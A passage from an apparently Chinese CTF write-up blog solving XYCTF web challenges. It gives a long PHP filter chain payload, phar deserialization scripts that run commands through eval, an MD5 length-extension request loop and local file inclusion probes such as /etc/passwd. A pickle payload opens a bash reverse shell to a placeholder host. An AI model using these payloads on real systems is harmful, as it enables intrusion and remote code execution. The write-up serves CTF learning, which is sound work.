class="number">932</span>|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-<span class="number">16</span>|convert.iconv.CSIBM1161.IBM-<span class="number">932</span>|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-<span class="number">16</span>|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-<span class="number">143</span>.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-<span class="number">16</span>|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.<span class="number">8859_4</span>.BIG5HKSCS|convert.iconv.MSCP1361.UTF-<span class="number">32</span>LE|convert.iconv.IBM932.UCS-<span class="number">2</span>BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-<span class="number">32</span>|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-<span class="number">16</span>|convert.iconv.CSIBM1161.IBM-<span class="number">932</span>|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|<span class="keyword">string</span>.<span class="title function_ invoke__">strip_tags123456string</span>(<span class="number">5</span>) <span class="string">&quot;XYCTF&quot;</span></span><br><span class="line">但是这个结果也不能直接拿来用</span><br><span class="line"><span class="number">123456</span><span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;XYCTF&quot;</span>这个是不能要的    </span><br><span class="line">同样 |<span class="keyword">string</span>.strip_tags是用来清理垃圾字符的</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">convert.base64-encode|convert.iconv.UTF8.UTF7||convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7||convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode|string.strip_tags</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/15/66441f362836a.png" alt="image-20240410214113647"></p><p>也可以使用脚本</p><blockquote><p>使用php:&#x2F;&#x2F;filter&#x2F;的过滤器进行编码绕过。</p><p>使用工具php_filter_chain_generator可以构造payload。</p><p>python3.11 php_filter_chain_generator.py - rawbase64</p><p>Vm0weGQxRXhiRmhVV0doVVlUSlNXVmxVUm5kWFZscFhVbEU&#x3D;&#x2F; 这后面的字符是XYCTF，进行多次</p><p>base64加密得到的，反正多搞几次去除多余杂乱的乱码。</p><p>这个出来之后有多出来的字符，可以通过base64解码进行去除，然后再payload后面加入</p><p>convert.base64-decode进行解码</p></blockquote><h2 id="pharme"><a href="#pharme" class="headerlink" title="pharme"></a>pharme</h2><p>这道题把我折磨惨了 方法都知道 队友根据这个方法也出了 就我一直没有回显 这周最后才做完这道题 最后发现之前一直都是开的两个页面做 一个本来那个 一个class.php 刚刚只开了一个页面 也就是做完本来那个页面 再开class.php就行了 服了</p><p>进入：</p><p><img src="https://bu.dusays.com/2024/05/15/66441f35b4792.png" alt="image-20240415173227054"></p><p>一个文件上传</p><p>f12中有hint</p><p><img src="https://bu.dusays.com/2024/05/15/66441f35724ce.png" alt="image-20240415173307026"></p><p>class.php</p><p>访问 给源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;ch3nx1&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^phar:\/\//i&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单看一下</p><p>有类 结合题目-&gt;phar 还有 file_get_contents 应该是phar反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">这里非常类似于无参数rce</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; 导致只能传入函数</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">这里需要注意外面的那个匹配函数，这里preg_replace函数使用正则表达式 /;+/ 来匹配一个或多个分号并</span><br><span class="line">把它替换为一个字符ch3nx1,本地测试一下:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,<span class="string">&#x27;;;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> 输出ch3nx1</span><br><span class="line">而</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,<span class="string">&#x27;;;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> 输出ch3nx1ch3nx1</span><br></pre></td></tr></table></figure><p>所以这里就会有脏字符</p><p>eval(); 那里如何绕过后面的脏数据。</p><ul><li><p>第一反应是像牢大那道题⼀样，用注释符号来绕过，但是如果使用&#x2F;&#x2F;或者#，就过不了正则匹配。</p></li><li><p>第⼆种思路就是，调用无参函数来终止执行后面的垃圾字符串</p><p>刚开始想的是用exit()或者die()来终止代码执行但是失败了，原因可能是这两个函数终止整个代码的执行</p></li></ul><p>那么就是要找⼀个只会终止后面代码执行的函数，最终在php官方手册中找到了满足要求的函</p><p>数：__halt_compiler()</p><p><strong>__halt_compiler()</strong></p><p>这是让编译器停止编译的函数，当编译器执行到这之后就不再去解析后面的部分了。</p><p>利用方法为</p><blockquote><p>cmd&#x3D;’show_source(array_rand(array_flip(scandir(getcwd()))));__halt_compiler();’</p></blockquote><p>这样在当前函数参数中不会当执行到__halt_compiler();就不会执行后面的语句，从而绕过脏数据。</p><p>先随便写一个phar文件上去看一下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>); <span class="comment">//删除之前的test.par⽂件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>); <span class="comment">//创建⼀个phar对象，⽂件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//开始写⽂件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="comment">//写⼊stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd=<span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span>-&gt;a=<span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写⼊meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的⽂件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>被ban了</p><p><img src="https://bu.dusays.com/2024/05/15/66441f34f2b3b.png" alt="image-20240415173831605"></p><p>简单绕过 直接gzip压缩一下</p><p>当然 压缩后直接传肯定是传不上去的 是白名单 只让jpg gif png这种的上去</p><p>所以 要把test.phar.gz的后缀phar.gz改了 </p><p>这里我是BP抓包改的</p><p><img src="https://bu.dusays.com/2024/05/15/66441f35e0e88.png" alt="image-20240415174257787"></p><p><img src="https://bu.dusays.com/2024/05/15/66441f358b6b1.png" alt="image-20240415174311097"></p><p>然后会返回存储的地址</p><p>注意这里还禁用了phar</p><p>绕过：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-</span><br><span class="line">encode/resource=phar:///tmp/1007eff891b86c550c4a6a188f670a31.pn</span><br><span class="line">g/test.txt</span><br><span class="line"></span><br><span class="line">file=compress.zlib://phar:///tmp/1b33718042e7dfe8fac079be96ebc4d9.gif/phar.phar</span><br></pre></td></tr></table></figure><p>一样的 都可以绕过</p><p>这样就可以正常执行我们的phar文件了 </p><p>先读一下根目录吧</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//.phar文件，后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，固定的</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd=<span class="string">&#x27;var_dump(((scandir(getcwd()))));__halt_compiler();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest --这里注意变通</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p><code>print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</code>这个也可以读更目录</p><p><img src="https://bu.dusays.com/2024/05/15/66441f370545a.png" alt="image-20240415171218106"></p><p>发现flag文件</p><p>然后就是随机读根目录文件就行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//.phar文件，后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，固定的</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd=<span class="string">&#x27;show_source(array_rand(array_flip(scandir(getcwd()))));__halt_compiler();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest --这里注意变通</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p><code>if(chdir(chr(ord(strrev(crypt(serialize(array())))))))show_source(array_rand(array_flip(scandir(getcwd()))));</code> 这个也是随机读根目录 只比上面的多一点</p><p><img src="https://bu.dusays.com/2024/05/15/66441f35a2275.png" alt="image-20240415172131388"></p><h2 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h2><p><img src="https://bu.dusays.com/2024/05/15/66441f363cb18.png" alt="image-20240415181135185"></p><p>这个肯定是php原生类反序列化，我们这里可以去找到真正可以利用的类，可以看到这里直</p><p>接给的是报错的界面，所以我们可以想到使用toString方法</p><p><img src="https://bu.dusays.com/2024/05/15/66441f36bd3c0.png" alt="image-20240503204432336"></p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p><img src="https://bu.dusays.com/2024/05/15/66441f362cc28.png" alt="image-20240503204820264"></p><p>看后缀可能认为是php做后端，但是服务器的响应式flask的框架(fake php)</p><p>经典注册登录 &#x2F;register.php</p><p>注册一个账号 1,1 登录成功后 查看 cookie</p><p><img src="https://bu.dusays.com/2024/05/15/66441f39a88f1.png" alt="image-20240503205016886"></p><p>经测试，发现过滤了R指令，有点像pickle反序列化进行RCE</p><p>抓包</p><p><img src="https://bu.dusays.com/2024/05/15/66441f3bae515.png" alt="image-20240503205142446"></p><p>注意cookie</p><p>这里就需要了解一下pickle反序列化，与函数执行相关的opcode有三个： R 、 i 、 o ，所以我们可以从</p><p>三个方向进行构造</p><p>这里过滤了我们的R方向的构造，所以我们可以使用其他的指令来达到rce的目的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a=<span class="string">&#x27;&#x27;&#x27;(S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a.encode()))</span><br></pre></td></tr></table></figure><p>在Cookie里面修改为我们的payload反弹shell就可以得到flag</p><p>根目录下拿到flag</p><p><img src="https://bu.dusays.com/2024/05/15/66441f37216ed.png" alt="image-20240503205307352"></p><h2 id="εZ-¿м-Kε¿"><a href="#εZ-¿м-Kε¿" class="headerlink" title="εZ?¿м@Kε¿?"></a>εZ?¿м@Kε¿?</h2><p>前面的makefile进阶</p><p>首先查看源码会发现有hint.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/^[$|\(|\)|\@|\[|\]|\&#123;|\&#125;|\&lt;|\&gt;|\-]+$/</span><br></pre></td></tr></table></figure><p>看到这个我们首先会发现，这大概是一个白名单，我们拿这个里面的符号去试一试会发现，这里面简单</p><p>的可以不被WAF掉。但是这里测试长度就会发现，这里的长度为7。</p><p>现在去了解一下makefile的特性</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$@--目标文件，$^--所有的依赖文件，$&lt;--第一个依赖文件</span><br></pre></td></tr></table></figure><blockquote><p>SHELL :&#x3D; &#x2F;bin&#x2F;bash</p><p>ifndef PATH</p><p>override PATH :&#x3D;</p><p>else</p><p>override PATH :&#x3D;</p><p>endif</p><p>.PHONY: FLAG</p><p>FLAG: &#x2F;flag</p></blockquote><p>这里 $&lt; 也就可以代替 &#x2F;flag 了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash /flag</span><br><span class="line">. /flag</span><br><span class="line">./flag （需要文件执行权限）</span><br><span class="line">/flag（需要文件执行权限）</span><br></pre></td></tr></table></figure><p>构造点显然不现实，这里 &#x2F;bin&#x2F;bash 可以通过 $0 代替，空格可以用 <strong>&lt;</strong> 代替</p><p>在之前的ezmake里面我们是直接用<code>$(shell)</code>,这里我们可以使用<code>$0</code>在 makefile 中<code>$()</code>应该也能起到和<code>$0</code>一</p><p>样的效果即代替 &#x2F;bin&#x2F;bash （和$$0一样都需要两个$）,我们可以使用$&lt;来代替我们的flag文件</p><p>所以构造</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$$(&lt;$&lt;)</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/15/66441f3668f4d.png" alt="image-20240503205952879"></p><h2 id="give-me-flag"><a href="#give-me-flag" class="headerlink" title="give me flag"></a>give me flag</h2><p>hash长度扩展攻击</p><p>典型md5长度扩展攻击 <code>md5($FLAG.$value.$time)===$md5</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$FLAG_md5</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">&#123; <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="keyword">die</span>(<span class="variable">$FLAG_md5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>.<span class="variable">$value</span>.<span class="variable">$time</span>)===<span class="variable">$md5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes, give you flag: &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理</p><p>后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值</p><p>这里我们可以联想到md5长度里面常见的攻击md5长度扩展攻击</p><p>这种攻击的基本原理是利用了MD5算法中输入长度与输出哈希值之间的关联关系，通过添加额外的数据**</p><p>来修改原始数据的哈希值，从而达到篡改数据的目的。</p><p>这里就不得不提到一个工具了， hashpump 我们直接</p><p><img src="https://bu.dusays.com/2024/05/15/66441f36a2273.png" alt="image-20240503220049652"></p><p>我们只需要中间这一部分</p><p>然后把所有的\x替换成%</p><p>%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%00</p><p>注意：</p><p>1.明文<code>&#125;</code>是可以不要的或者随便传一字符 因为在最后计数新md5时 他会直接调用旧的md5值 </p><p>也就是说可以传abc 只是后面的字符长度要改为40（43-3）</p><p>2.字符长度需要猜一下（通过之前的flag来）</p><p>3.扩展的那一部分是时间戳 这里要把时间戳后移60s</p><p>也可以用<a href="https://github.com/shellfeel/hash-ext-attack">这个脚本</a></p><p><img src="https://bu.dusays.com/2024/05/15/66441f3741286.png" alt="image-20240503220752175"></p><p>然后传参：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5=c3512fdf01f911d012d043c8b39ed98e&amp;value=%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%00</span><br></pre></td></tr></table></figure><p>手动发包也行 BP爆破发包也行</p><p>这里写了给脚本来重复发包</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:54572/?md5=c3512fdf01f911d012d043c8b39ed98e&amp;value=%80%00%00%00%00%00%00%00%00%00%0%00%00X%01%00%00%00%00%00%00&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">res=requests.get(url=url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/15/66441f37e32cc.png" alt="image-20240503221030070"></p><h2 id="ezLFI"><a href="#ezLFI" class="headerlink" title="ezLFI"></a>ezLFI</h2><p>这个题可以通过查看源码得到，这里是一个文件包含，所以我们可以尝试一些本地文件包含的一些</p><p>payload,</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/15/66441f3703836.png" alt="image-20240503221218346"></p><p>我们可以看到这个是有回显的，我们可以去包含网站服务器的本地文件，比如说临时文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/proc/cpuinfo</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/15/66441f376dbdb.png" alt="image-20240503221242200"></p><p>这个可以查看网站里面的进程，可以看到网站的cpu的信息，所以我们就直接尝试利用上传文件，</p><p>然后去包含我们上传的文件，这个就需要条件竞争，这个可以使用脚本来上传，GET到FLAG。这个</p><p>办法是可行的，但是试了之后就会发现，这个比较考验服务器的质量（QAQ）。</p><p>这里我们就换一个方法，利用伪协议去包含我们的临时文件，这里我们需要改一下过滤器，通过转</p><p>换过滤器，一直转换，就可以生成我们的终极payload,</p><p>这里用到的就是一个脚本，通过叠加过滤器能够在allow_url_fopen和allow_url_include双Off的情</p><p>况下直接通过php:&#x2F;&#x2F;filter进行文件包含getshell</p><p><strong>PHP filter chain generatorPHP</strong>过滤链发生器：一个CLI生成PHP过滤器链，得到你的RCE不需要</p><p>上传一个文件，如果你完全控制参数传递给一个要求或包含在PHP里面 </p><p>使用</p><p>1.<a href="https://github.com/synacktiv/php_filter_chain_generator">php_filter_chain_generator</a></p><p>2.<a 